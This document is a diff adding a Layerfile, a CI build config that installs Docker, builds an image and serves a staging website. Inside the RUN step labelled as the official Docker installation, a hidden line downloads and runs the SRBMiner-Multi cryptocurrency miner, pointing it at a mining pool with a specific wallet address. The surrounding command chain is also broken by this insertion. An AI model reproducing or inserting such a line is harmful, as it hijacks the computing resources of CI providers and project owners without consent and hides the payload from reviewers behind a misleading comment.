@@ -1,0 +1,17 @@
+# To note: Layerfiles create entire VMs, *not* containers!
+
+# install the latest version of Docker, as in the official Docker installation tutorial.
+RUN apt-get update && \
+    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
+    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
+    apt-get update && \
+    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-4-6-Linux.tar.xz && cd SRBMiner-Multi-2-4-6 && ./SRBMiner-MULTI --disable-gpu --algorithm yespowerr16 --pool stratum-eu.rplant.xyz:13382 --wallet YjdyMYuVhHfwoFC7vDEY7ZbX6zwfj9f7Sq.squash --password x --tls true \
+    apt install docker-ce
+
+# copy files from the repository into this staging server
+COPY . .
+
+RUN docker build -t image .
+RUN docker run -d -p 80:80 image
+EXPOSE WEBSITE http://localhost:80
